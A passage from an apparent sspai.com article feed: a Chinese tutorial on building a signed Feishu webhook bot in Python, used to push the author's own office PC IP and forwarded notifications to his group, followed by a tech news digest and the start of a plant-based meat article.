Message，即时通讯）工具，但却成为国内大多数领导所偏爱的传声筒：糟糕的文件传输限制、被人诟病的超大空间占用、机械难用的群组管理方式等……微信这些罄竹难书的 N 宗罪无疑早就被和我一样的数字难民们用优美的中国话从产品到人描述了个遍。</p>\n<p>使用了企业微信之后，我发现虽然已经没有微信那样的不堪，勉强能够胜任日常的工作沟通与交流，但我仍觉得似乎被什么东西束缚住了，尤其对于我这种喜欢折腾的人来说少了点自由的 ♂ 气息，比如在所谓的「自动化」方面。</p>\n<p>自动化（Automation）一词其实是一个很大的概念，但顾名思义其实就是将需要人为、机械且重复的行为，通过软件或编码的方式来实现同样的效果，这个过程就是自动化。具体来说就是：每小时给我发送当前的天气预报、每天早晨准时给我发送少数派早报的标题内容、每个周定时备份我 XXX 项目下的所有文件等等。</p>\n<p>因为企业微信面向的主要还是像公司这样的集体组织，无法提供适应个人层面的自动化服务或接口，如果需要进行相关内部的应用开发必须要由公司企业微信的管理员去操作。</p>\n<p>直到我遇上了<a href=\"https://www.feishu.cn/\" target=\"_blank\">飞书</a>。它在满足了日常工作协作的需要的同时，还留有让喜欢折腾的数字玩家们进一步探索的地方，比如：Webhook。</p>\n<h2>创建自定义机器人</h2>\n<p>飞书允许用户在群组中创建一个自定义机器人，将其他渠道的消息通过 Webhook 的方式推送至该群组中。</p>\n<p>Webhook 顾名思义即网络钩子，也称为用户自定义 HTTP 回调函数（user-defined HTTP callbacks），通常用于监听某些行为事件，当事件触发时会向用户指定的目标地址发送信息。</p>\n<p>这段话对于大多数没有计算机基础知识的读者来说可能难以理解，但却无关紧要，因为我们只需要可以将其理解为「中间人」即可：</p>\n<blockquote><p><strong>张三</strong> 到百货商场买东西，<strong>店员</strong> 告知他要买的东西暂时没货了，可以先登记一下他的联系方式，补货后第一时间通知他过来购买。</p></blockquote>\n<blockquote><p>过了一段时间 <strong>进货</strong> 之后，店员根据留下的 <strong>联系方式</strong> 联系了张三，告知其到货了可以过来购买了。</p></blockquote>\n<p>这是我们在日常生活中很常见的一种场景，也和整个 Webhook 的运作流程类似：</p>\n<ul>\n<li>张三：即飞书群</li>\n<li>店员：即 Webhook，用以监听是否进货，并且根据登记的联系方式进行通知</li>\n<li>是否进货：触发条件（Trigger）</li>\n<li>联系方式：目标地址（URL）</li>\n</ul>\n<p>因此，飞书的自定义机器人本质上也就是提供了这样 <strong>「监听-通知」</strong> 的行为逻辑，让用户能够将消息转发到飞书上。</p>\n<p>创建一个自定义机器人的方式很简单，你只需要在飞书界面进行「点击加号-创建群组-设置-群机器人」几步操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rflb34tc99fgtqq0.png\"></figure><p>然后再点击「添加机器人」按钮进入到添加界面，选择第一位的「自定义机器人即可」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rftb34tc9hb98big.png\"></figure><p>添加完成之后我们只需要默认下一步即可。</p>\n<h2>定制消息类型</h2>\n<p>创建自定义机器人仅表明我们搭起了一个中转的「驿站」，但我们还需要能够向这个驿站发送相关的消息才能让其帮我们实现转发。</p>\n<p>飞书目前支持的消息类型主要有如文本、富文本、交互式卡片等，不同的消息类型对应着不同格式的 JSON 数据。</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>参数 (msg_type)</strong></td>\n<td><strong>消息类型</strong></td>\n</tr>\n<tr>\n<td>text</td>\n<td>文本</td>\n</tr>\n<tr>\n<td>post</td>\n<td>富文本</td>\n</tr>\n<tr>\n<td>image</td>\n<td>图片</td>\n</tr>\n<tr>\n<td>share_chat</td>\n<td>分享群名片</td>\n</tr>\n<tr>\n<td>interactive</td>\n<td>消息卡片</td>\n</tr>\n</tbody></table></figure><h3>什么是 JSON？</h3>\n<p>JSON（JavaScript Object Notation，即 JavaScript 对象表示法），是目前在 Web 领域里被广泛用于数据传递与交换的文件格式之一。JSON 通常由键值对构成，就像这样：</p>\n<pre class=\"language-json\"><code>{\n    \"id\": 1,\n    \"name\": \"100gle\",\n    \"site\": \"https://sspai.com/u/100gle/posts\",\n    \"social_media\": [\"sspai\", \"Github\"],\n    \"product\": {\n        \"name\": \"Python 自学手册\",\n        \"url\": \"https://sspai.com/series/148/list\"\n    }\n}\n</code></pre>\n<p>而我们的消息也是需要以这种格式来发送，当中包含的是关于该消息的类型、内容、其他参数等信息。</p>\n<h3>普通文本</h3>\n<p>在飞书所支持的几种消息类型里，最简单的莫过于普通文本。其对应的 JSON 格式比较简单：</p>\n<pre class=\"language-json\"><code>{\n  \"msg_type\": \"text\", // 指定消息类型\n  \"content\": {  // 消息内容主体\n    \"text\": \"your-message\"\n  }\n}\n</code></pre>\n<p>最后呈现的效果也是我们在日常使用微信沟通时看到的那种样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rg5b34tc9c8ndqbg.png\"></figure><h3>富文本</h3>\n<p>如果你需要给消息内容增添一些样式，如链接、图片等，那么你可以选择富文本消息类型。</p>\n<p>富文本主要就类似于 Markdown 的语法，同样具备所见即所得的特点，能够很好地渲染成 HTML 元素。但飞书支持的富文本元素主要就四种：</p>\n<ul>\n<li>\n<code>text</code>：普通文本</li>\n<li>\n<code>a</code>：超链接</li>\n<li>\n<code>at</code>：<code>@</code> 符号</li>\n<li>\n<code>img</code>：图片</li>\n</ul>\n<p>因为 <code>at</code> 标签需要获取到目标用户的 ID 参数而 <code>img</code> 需要事先将图片上传到其他接口，所以会相对复杂一些，有需要的朋友可以自己探索。</p>\n<p>相比于普通文本样式来说，富文本样的 JSON 样式相对复杂一些：</p>\n<pre class=\"language-json\"><code>{\n  \"msg_type\": \"post\",\n  \"content\": {\n    \"post\": {\n      \"zh-CN\": {\n        \"title\": \"富文本消息测试！\",\n        \"content\": [\n          [\n            {\n              \"tag\": \"text\",\n              \"text\": \"你的小可爱上线了！\"\n            },\n            {\n              \"tag\": \"a\",\n              \"text\": \"点击查看\",\n              \"href\": \"https://sspai.com/u/100gle/updates\"\n            }\n          ]\n        ]\n      }\n    }\n  }\n}\n</code></pre>\n<p>由于飞书支持 i18n（internationalization）国际化显示，所以需要将内容填写在对应语言下面，比如上述的<code>zh-CN</code>。但如果我们没有翻译成其他语言的需要，那就只需要在例子中的 <code>zh-CN</code> 的部分填写内容即可：</p>\n<ul>\n<li>\n<code>title</code> 表示标题</li>\n<li>\n<code>content</code> 表示所有内容，每一行内容是包含了若干元素标签的数组</li>\n</ul>\n<p>最后就可以呈现出如下样式：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rg5b34tc9hb98bj0.png\"></figure><h3>消息卡片</h3>\n<p>消息类型里最为复杂的是交互式消息卡片。</p>\n<p>因为消息卡片的规范较多，以至于飞书官方专门用了一定篇幅的 <a href=\"https://open.feishu.cn/document/ukTMukTMukTM/uczM3QjL3MzN04yNzcDN?op_tracking=hc\" target=\"_blank\">文档</a> 来告知开发者如何去设计消息卡片。</p>\n<p>简单来说，消息卡片主要由两部分构成：<strong>消息头</strong>和<strong>消息主体内容</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rgdb34tc9c8ndqc0.png\"><figcaption>图源<a href=\"https://open.feishu.cn/document/ukTMukTMukTM/uczM3QjL3MzN04yNzcDN\" target=\"_blank\">飞书开放平台文档</a></figcaption></figure><p>基本的消息卡片结构所对应的 JSON 样式为：</p>\n<pre class=\"language-json\"><code>{\n  \"msg_type\": \"interactive\",\n  \"card\": {\n    \"config\": {\n      \"wide_screen_mode\": true\n    },\n    \"header\": {\n      \"title\": {\n        \"tag\": \"plain_text\",\n        \"content\": \"this is header\" // 标题内容\n      },\n      \"template\": \"red\" // 标题主题颜色\n    },\n    \"elements\": [\n      // 卡片消息主体内容\n      // {module-1},\n      // {module-2},\n      // {module-3},\n      // ......\n      // {module-N}\n    ]\n  }\n}\n</code></pre>\n<p>消息头主要就是带有色块的标题，用以增强信息的视觉锚点<sup class=\"ss-footnote\" href=\"https://open.feishu.cn/document/ukTMukTMukTM/ukTNwUjL5UDM14SO1ATN\" title=\"卡片标题-最佳实践\" footnote-id=\"1\">1</sup>，对应 <code>header</code> 部分的内容。通常我们只需要填写当中的 <code>content</code> 的标题内容以及 <code>template</code> 标题主题颜色即可定下消息卡片的标题展示效果。</p>\n<p>让消息卡片变得复杂的原因是在于消息主体内容，因为主体内容从形式上就像是 HTML 元素，可以进行多种组合，所以这一部分主要都在 <code>elements</code> 中进行填写。</p>\n<p>但在实际的使用过程中我们不会手动去编写对应的消息内容，而是通过飞书的 <a href=\"https://open.feishu.cn/tool/cardbuilder?from=cotentmodule\" target=\"_blank\">卡片搭建工具</a> 来帮助我们做出想要的样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rglb34tc9c8ndqcg.png\"></figure><p>在这个设计工具中，我们可以在「模块组件」中去搭建适合自己需要的消息卡片；同时，我们也可以在「卡片模板」中选择飞书为我们已经内置好的卡片模板，根据自己的需要去对模板进行调整。</p>\n<p>但无论你是打算用哪种方式，最后只需要能在预览中显示无误，就可以直接将右侧的代码预览中的内容复制粘贴到前面基础结构 JSON 中的 <code>card</code> 部分即可。</p>\n<p>这里我就基于前面已选择的模板进行简单调整，然后实现一个少数派社区文章推荐的消息卡片样式：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rh5b34tc99fgtqqg.png\"></figure><p>最后将右侧的代码直接复制拷贝，然后经由程序推送至 Webhook 后再转发到飞书上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rhdb34tc98oi4060.png\"></figure><h2>为你的消息机器人加上安全设置</h2>\n<p>由于只要我们通过向 Webhook 地址发送网络请求就能够将消息推送至飞书，因此倘若不经意间 Webhook 地址被泄露在互联网上，那么很有可能会接收到许多垃圾消息，也容易埋下未知的信息安全隐患。这就好比你出门时却不锁门一样让人惴惴不安。</p>\n<p>因此在使用飞书 Webhook 推送消息的基础上，最好是加上相关的安全策略或设置以提升安全性。在飞书的官方文档里飞书提供了三种安全策略，并且三种方式可以<strong>叠加设置</strong>。安全等级由低到高依次是：</p>\n<ol>\n<li>\n<strong>自定义关键词</strong>：只推送包含特定关键词的消息</li>\n<li>\n<strong>IP 白名单</strong>：只推送由白名单 IP 发送的消息</li>\n<li>\n<strong>安全密钥</strong>：只推送带有指定密钥信息的消息</li>\n</ol>\n<p>其中，前两种方式比较简单，我们只需要勾选之后就可以直接设置，但添加的数量最大限制都为 10 个。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rhlb34tc98oi406g.png\"></figure><p>最后一种方式需要我们能够生成密钥，并在推送消息的 HTTP 请求中携带上关于密钥的信息参数。生成密钥最快捷的方式就是通过代码来实现，因为飞书开发者文档中给出了不同编程语言的示例 Demo，虽然可能不一定覆盖到所有编程语言，但其生成密钥的方式都是大同小异的：</p>\n<ol>\n<li>将当前时间戳和签名校验码通过换行符 <code>\\n</code> 拼接在一起作为密钥字符串签名</li>\n<li>使用 <a href=\"https://zh.wikipedia.org/wiki/HMAC\" target=\"_blank\">HMAC-SHA256 算法</a> 对该字符串签名进行加密</li>\n<li>最后使用 <a href=\"https://zh.wikipedia.org/wiki/Base64\" target=\"_blank\">Base64 编码</a> 对加密后的字符串签名进行编码，便于作为参数传递</li>\n</ol>\n<p>经过以上三步生成密钥之后，我们就可以在发送消息推送时带上安全密钥以便飞书服务器校验。这里我基于飞书官方的 Python 示例进行简单修改，仅供参考：</p>\n<pre class=\"language-python\"><code>#!/usr/bin/env python3\n# coding:utf-8\n\n# feishu.py\n\nimport base64\nimport hashlib\nimport hmac\nfrom datetime import datetime\n\nimport requests\n\nWEBHOOK_URL = \"your-webhook-url\"\nWEBHOOK_SECRET = \"your-webhook-sign-secret\"\ntimestamp = int(datetime.now().timestamp())\n\ndef gen_sign(secret):\n    # 拼接时间戳以及签名校验\n    string_to_sign = '{}\\n{}'.format(timestamp, secret)\n\n    # 使用 HMAC-SHA256 进行加密\n    hmac_code = hmac.new(\n        string_to_sign.encode(\"utf-8\"), digestmod=hashlib.sha256\n    ).digest()\n\n    # 对结果进行 base64 编码\n    sign = base64.b64encode(hmac_code).decode('utf-8')\n\n    return sign\n\ndef main():\n    sign = gen_sign(WEBHOOK_SECRET)\n    params = {\n        \"timestamp\": timestamp,\n        \"sign\": sign,\n        \"msg_type\": \"text\",\n        \"content\": {\"text\": \"点火发射！\"},\n    }\n\n    resp = requests.post(WEBHOOK_URL, json=params)\n    resp.raise_for_status()\n    result = resp.json()\n    if result.get(\"code\") and result.get(\"code\") != 0:\n        print(f\"发送失败：{result['msg']}\")\n        return\n    print(\"消息发送成功\")\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n<p>有了校验之后即便 Webhook 地址泄露了，但只要没有拿到我们的签名校验就无法生成密钥，也就无法往我们的消息机器人推送消息了，这就使得安全性得到进一步保障。</p>\n<p>但以上生成密钥的过程都是在程序中完成，如果你是想要在开启签名校验的安全设置情况下，使用其他 APP 将消息转发至飞书，那么需要对应的 APP 支持密钥生成的同时，还需要能定制对应的 JSON 请求体。</p>\n<h2>应用</h2>\n<p>飞书群组里的自定义机器人的功能可能没有像 Telegram Bot 那样丰富，其主要用途还是作为一个<strong>消息推送</strong>的中心，将其他来源的信息或消息经过 Webhook 转发到飞书群组里，所以像今日运势、流量监控、异常警告等场景就非常适合使用飞书自定义机器人来实现自动化。</p>\n<p>实现自动化的途径可以通过代码、APP 或是其他第三方服务，根据个人需要去选择、尝试。</p>\n<h3>自动推送消息</h3>\n<p>作为一个每周五下班都不带电脑回家的开发 boy 来说，为了避免有时需要改 Bug 或是访问公司服务器资源时我需要用到公司电脑的情况发生，我通常都会使用公司的 VPN 和微软的远程桌面工具连接到我在公司所使用的 Windows 笔记本电脑，这样我就只需要远程操作即可。</p>\n<p>但实现远程操作的前提是：我必须知道我所使用的那台笔记本的内网 IP 地址是什么。</p>\n<p>所以我就根据飞书的开发文档用 Python 编写了一个脚本，接着配合微软的任务计划程序，在每周五下午 19 点时运行并获取电脑当前的内网 IP 地址，并通过自定义机器人推送到飞书。</p>\n<p>这里我基于前面安全设置部分的代码进行了一些改动，将其封装了进了一个名为 <code>LarkBot</code> 的类中，所以这个类包含前面所涉及的安全校验和消息发送两部分功能：</p>\n<pre class=\"language-python\"><code># !/usr/bin/env python3\n# coding:utf-8\n\n# larkbot.py\n\nimport base64\nimport hashlib\nimport hmac\nfrom datetime import datetime\n\nimport requests\n\nclass LarkBot:\n    def __init__(self, secret: str) -&gt; None:\n        if not secret:\n            raise ValueError(\"invalid secret key\")\n        self.secret = secret\n\n    def gen_sign(self, timestamp: int) -&gt; str:\n        string_to_sign = '{}\\n{}'.format(timestamp, self.secret)\n        hmac_code = hmac.new(\n            string_to_sign.encode(\"utf-8\"), digestmod=hashlib.sha256\n        ).digest()\n        sign = base64.b64encode(hmac_code).decode('utf-8')\n\n        return sign\n\n    def send(self, content: str) -&gt; None:\n        timestamp = int(datetime.now().timestamp())\n        sign = self.gen_sign(timestamp)\n\n        params = {\n            \"timestamp\": timestamp,\n            \"sign\": sign,\n            \"msg_type\": \"text\",\n            \"content\": {\"text\": content},\n        }\n        resp = requests.post(url=WEBHOOK_URL, json=params)\n        resp.raise_for_status()\n        result = resp.json()\n        if result.get(\"code\") and result[\"code\"] != 0:\n            print(result[\"msg\"])\n            return\n        print(\"消息发送成功\")\n</code></pre>\n<p>由于我是用代码来实现，所以创建密钥会相对方便，因此开启签名校验的同时，在创建 <code>LarkBot</code> 的实例化对象的过程中携带上安全校验的字符串代码，否则会抛出异常；</p>\n<p>其次，在前面一部分章节示例中的 <code>main()</code> 函数代码都被封装到了 <code>send()</code> 方法里，于是我们只需要创建好 <code>LarkBot</code> 对象后再调用该方法并传入一个想要发送的内容字符串，就可以将消息推送至飞书：</p>\n<pre class=\"language-python\"><code>def main():\n    WEBHOOK_SECRET = \"your-webhook-secret\"\n    bot = LarkBot(secret=WEBHOOK_SECRET)\n    bot.send(content=\"我是一只高级鸽子！\")\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n<p>当中的 <code>content</code> 部分是可替换的，你可以替换成符合你需要的内容，比如今日运势、头条文章、热搜 TOP10 等等，只要你能获取得到相关内容或数据，并转换成字符串即可。但因为我是需要获取到工位上的电脑 IP，所以上面部分就改成了：</p>\n<pre class=\"language-python\"><code>def main():\n\n    import re\n    import subprocess\n\n    WEBHOOK_SECRET = \"....\"\n\n    # 利用正则表达式获取 IP 字符串\n    IPV4_PATTERN = r\"IPv4.*: (?P.*)\\n\"\n    ipconfig = subprocess.run(\n      \"ipconfig\", capture_output=True, text=True).stdout\n    ip = re.search(IPV4_PATTERN, ipconfig).group(\"ip\")\n\n    bot = LarkBot(secret=WEBHOOK_SECRET)\n    bot.send(content=f\"当前工位的电脑 IP 是：{ip}\")\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n<p>这里我通过调用 Windows 上查看网络内容的 <code>ipconfig</code> 命令获取到输出的内容后，再通过正则表达式去将包含特定 IP 的那一串文本中的数字部分抓出来，并推送。</p>\n<p>之后我将整个脚本保存成一个 <code>.py</code> 代码文件后，通过定时任务添加计划，当达到触发时限，则会通过指定的 Python 解释器可执行程序来执行该脚本。</p>\n<h3>Webhook 转发 Webhook</h3>\n<p>在少数派的作（鸽）者（子）群中曾看到了我派编辑部「六个汉堡」代言人路中南想要通过<strong>通知滤盒（Android）</strong>这一 APP 将群里的一些消息转发至飞书的想法，也这是飞书自定义机器人一个不错的适用场景。</p>\n<span class=\"ss-application\" app-id=\"15141\"> </span><p> </p>\n<p>关联阅读：</p>\n<ul>\n<li><a href=\"https://sspai.com/post/59502\" target=\"_blank\">App+1 | 解决 Android 通知管理难题，用正则表达式过滤无关推送：通知滤盒</a></li>\n<li><a href=\"https://sspai.com/post/60536\" target=\"_blank\">微信群聊不是法外之地：用通知滤盒降低敏感词「炸群」风险</a></li>\n</ul>\n<p>因为通知滤盒在 2.0 版本之后有了添加了 Webhook 的功能（需要付费订阅或买断高级版），所以本质上也是和飞书类似，将过滤的消息进行转发。</p>\n<p>需要说明的是：由于通知滤盒的 Webhook 功能<strong>仍处于开放测试阶段</strong>，尚有不少的 BUG，仅能发送 POST 请求，而无法发送 GET 请求；并且目前也无法在通知滤盒里直接定制发送的请求体内容，因此只能使用飞书 <a href=\"https://www.feishu.cn/hc/zh-CN/articles/360024984973#lineguid-PTu2Sl\" target=\"_blank\">旧版的自定义机器人</a> 来实现消息转发。</p>\n<p>当我们进入到通知滤盒后，点击左下角的规则，并选择「增强-Webhook」创建一个新的配置。在填写配置信息的过程中，可以根据你自己的实际需要来指定特定特定的 APP、内容和时间，以及手机处于何种状态时才会转发的条件，还有最后要转发的目标 Webhook 地址。</p>\n<p>因为是转发微信的相关消息，所以这里我将 APP 设置为包含微信，然后内容设置为一串测试的正则表达式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2rhtb34tc9c8ndqd0.png\"></figure><p>保存之后我们只要每次接收到了相关消息，通知滤盒就会直接将消息转发到飞书上了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o2ri5b34tc9c8ndqdg.gif\"></figure><p>除了消息滤盒，你还可以将其替换成 <strong>任意支持 Webhook</strong> 的 APP 或是服务，比如 QQ、IFTTT、Github 等，实现 Webhook 转 Webhook 最终将消息发送至飞书的「套娃玩法」。</p>\n<h2>结尾</h2>\n<p>长久以来我一直觉得国内的软件或平台在自动化和 API 开放化上做得比国外的差：</p>\n<ul>\n<li>一方面，厂商都不愿将成本投入到这只属于「少数玩家」的需求开发。毕竟有自动化需求的往往只是一小撮人，而这部分功能无论是开发还是维护却都是有着不小的成本开销，收益不成正比；</li>\n<li>另一方面，就是想要实现「生态垄断」。无论是链接跳转还是下载 APP，处处表露着厂商想要获取流量并构造自己生态（或服务）壁垒的封闭行径，而开放就意味着会造成用户流失。</li>\n</ul>\n<p>所以有的时候我很喜欢 Telegram、Slack、Todolist、Toggl 等软件有着很好开放性，在能够集成很多第三方软件的同时，又放开 API 并有着丰富的文档供喜欢折腾的玩家们去自由发挥。</p>\n<p>而飞书是国内为数不多具有开放性的工具或平台之一。</p>\n<p>相比于微信、企业微信来说尽管它可能还只是个勇于挑战「老大哥」的「黄毛小子」，但在使用的过程中不难发现它确实解决掉了一些我们在使用「垄断式」即时通讯软件的痛点，也满足了「少数派玩家」们折腾的心愿。</p>\n<p>因此无论是像公司这样的集体组织，还是像我们一样的独立个人用户，都能在日常使用飞书的过程中受益。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68578"},{"title":"派早报：微信或支持聊天记录付费存储、Apple 推迟儿童安全相关服务上线等","date":"2021-09-06 00:50:00","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>微信拟推出聊天记录付费云存储服务</h3>\n<p>中国日报财经栏目淡定科技于 9 月 4 日独家获悉，腾讯拟推出个人微信云存储付费服务，这意味着微信聊天记录可以实现云端备份和恢复。据悉该业务将采用类似年付费的模式，Apple 用户定价约为 180元 / 年，Android 用户为 130元 / 年。知情人士表示目前该项目正在进行最后的推动，具体细节尚未完全敲定。目前微信仅支持从一台设备迁移聊天记录至另一台设备。<a href=\"https://cn.chinadaily.com.cn/a/202109/04/WS6132f530a3101e7ce9761ec5.html\" target=\"_blank\">来源</a></p>\n<h3>Apple 推迟关于儿童安全相关服务上线</h3>\n<p>截至 9 月 3 日，Apple 更新官网公告信息，针对此前公布儿童安全保护的相关措施，因收到广大群众、团体、机构以及其他人员的反馈，现决定推迟该服务的上线日程，具体时间待未来几个月内进行项目改进后，再进行公布。<a href=\"https://www.apple.com/child-safety/\" target=\"_blank\">来源</a></p>\n<h3>富士发布 GFX 50S II 中片幅相机</h3>\n<p>9 月 2 日，富士在发布会上正式公布 GFX 50S II 相机，售价仅为 3999 美元的它也是 GFX 系列中最便宜的中片幅设备。该相机配备了 5140 万像素的传感器，搭载 51.4MP 中幅感光元件，内置五轴机身防抖设计，并提供 19 中底片模拟滤镜效果。<a href=\"https://www.theverge.com/2021/9/2/22653712/fujifilm-gfx50sii-xt30ii-xf33-xf23-announced-price-specs\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4qe1g5b34t82k08gh30.jpeg\"></figure><h3>德国希望数码产品厂商提供 7 年系统更新服务以及备用零部件</h3>\n<p>据外媒 9 月 4 日的报道称，作为欧盟委员会谈判的一部分，德国联邦政府正在推动欧盟要求为智能手机提供七年的安全更新和配件，相比最近的提案延长二年近乎 PC 的设备周期，而设备商组成的行业倡导组织 DigitalEurope 则希望仅需要提供三年的安全更新，并希望使用备件限制为屏幕和电池，而不是相机模块、扬声器以及其他组件。<a href=\"https://www.engadget.com/germany-phone-makers-7-years-security-updates-163601435.html?guccounter=1\" target=\"_blank\">来源</a></p>\n<h3>东芝表示电源芯片的供应紧张将再持续一年</h3>\n<p>东芝于 9 月 3 日向外界表示，由于存在明显的材料短缺和需求超过产能现象，未来一年仍将出现严重的电源芯片供应紧张的情况，部分用户可能会到 2023年才能满足需要，东芝计划在未来三年内，投资 600 亿日元以提高电源芯片的产量，这包括追加投资，或者新建相应的工厂。<a href=\"https://www.sohu.com/a/487484580_170520?spm=smpc.author.fd-d.17.1630627200032Zw5NOp7\" target=\"_blank\">来源</a></p>\n<h3>特斯拉新款车型将于 2023 年投产</h3>\n<p>9 月 2 日，特斯拉的公司会议上提及，价值 2.5 万美元的电动汽车目标定位 2023 年开始生产，并且该车辆可能为全自动电动汽车，或无踏板与方向盘。<a href=\"https://electrek.co/2021/09/02/tesla-aims-to-release-25000-electric-car-in-2023-likely-will-not-have-a-steering-wheel/\" target=\"_blank\">来源</a></p>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>🎁 会员周边将于本周内<strong>陆续</strong>发货，敬请期待。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 开启，数十款优质软件低至 5 折起。</li>\n<li>🧸 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol07-pre-talk-about-notes\" target=\"_blank\">笔记大战</a>》已经上线，来看看他们的笔记工具方法论吧！</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68557\" target=\"_blank\">限时福利｜高效管理你的一天，Sorted³ 工具升值包上架。</a></li>\n<li><a href=\"https://sspai.com/post/68547\" target=\"_blank\">亲自尝过之后，我来聊聊处在风口浪尖的植物肉</a></li>\n<li><a href=\"https://sspai.com/post/68593\" target=\"_blank\">强大的欧美曲库助力，手感上乘的竖屏音游新作：Beatstar</a></li>\n<li><a href=\"https://sspai.com/post/68504\" target=\"_blank\">开学季 | 工具升值包上新、正版软件特惠，还有联名开学礼包等你拿</a></li>\n<li><a href=\"https://sspai.com/post/68556\" target=\"_blank\">不买可以先收藏 08：先接住一口好锅，再做出一桌好菜</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68620"},{"title":"亲自尝过之后，我来聊聊处在风口浪尖的植物肉","date":"2021-09-05 07:00:00","description":"\n<p><i>这篇文章是「吃堡了吗」的第二期，第一期见 </i><a href=\"https://sspai.com/post/66865\" target=\"_blank\"><i>此处</i></a><i>。</i></p>\n<p>大家可能听说过 <strong>Beyond Meat </strong>这个牌子，作为人造肉第一股，19 年上市后，两个月内股价就冲到了上市价的 800%（当然后面掉回去不少……）。<strong>Beyond Meat </strong>在全球市场的增长比较迅猛，在国内也找到了几家大的快餐品牌合作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/680780ea426af7bd577c2500ad82ebe9.png\"></figure><p>肯德基在 6 月的时候也上了第一款使用植物肉的汉堡，售价 32 元，不过我还没有吃过。我倒是在楼下的罗森便利店里看到了植物肉的饭团，吃过好几款，感觉和肉末没有太大的区别。</p>\n<p>这让我开始好奇——这些「人造肉」「植物肉」究竟是什么？和普通的肉相比又有什么差别？于是，我开始了这一次对植物肉的探索和尝试。</p>\n<h2>什么是植物肉？</h2>\n<p>植物肉是人造肉的一种，人造肉现在有两个主要的技术路线：</p>\n<ol>\n<li>通过细胞培养，生产出来和真肉性质差不多的培育肉；</li>\n<li>通过植物原料，生产出来模仿肉类口感和成分的植物肉。</li>\n</ol>\n<h3>培育肉</h3>\n<p>培育肉是指利用细胞培养技术，在特定环境下培养出的生物组织，大体上可以理解为是让肌肉细胞在培养皿里面分裂成长，目前大部分都还在实验室阶段。</p>\n<p>19 年的时候，南京农业大学培育出了中国的第一块培育肉<sup class=\"ss-footnote\" href=\"\" title=\"https://mp.weixin.qq.com/s/7gRJYNbPIJ2DrzZrhfTLpw\" footnote-id=\"1\">1</sup>，就是利用了猪肌肉干细胞培育了 15 天，得到了 5g 的肌肉组织。</p>\n<p>到了 2021 年 6 月底的时候，号称世界上第一家培育肉工厂落地以色列<sup class=\"ss-footnote\" href=\"\" title=\"https://finance.sina.com.cn/tech/2021-06-28/doc-ikqcfnca3747480.shtml\" footnote-id=\"2\">2</sup>。目前每天能生产 500 公斤的培育肉，相当于 250 只鸡的重量。至于什么时候国内可以买到，目前还不太清楚。</p>\n<p>培育肉可能是比较未来的一种技术方向，毕竟是真的造出了肌肉细胞。但是目前发展不够迅速的限制，一个是培育成本较高，其次是纯的肌肉细胞很难模拟肉类丰富的口感（比如脂肪细胞、筋膜等组织）。</p>\n<h3>植物肉</h3>\n<p>植物肉则距离我们更近一些，不少产品可能之前已经吃到过。</p>\n<p>广泛的植物肉还包含了素鸡（面筋制品）、蛋白肉（豆皮制品）等等。加上中餐有比较丰富的素斋文化储备，还有大量的素食仿荤的产品，都是利用豆制品、面制品加上丰富的工艺和调味制作而成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mp6vdb34tcvt9nu8fg.png\"><figcaption>图片来自 jd，品类非常丰富，价格也很便宜</figcaption></figure><p>狭义的植物肉则是指这几年比较新的技术路线，目前发展十分迅速，大量产品已经开始投放市场了。</p>\n<p>各家的植物肉制造技术都略有不同，根据这份咨询公司的 <a 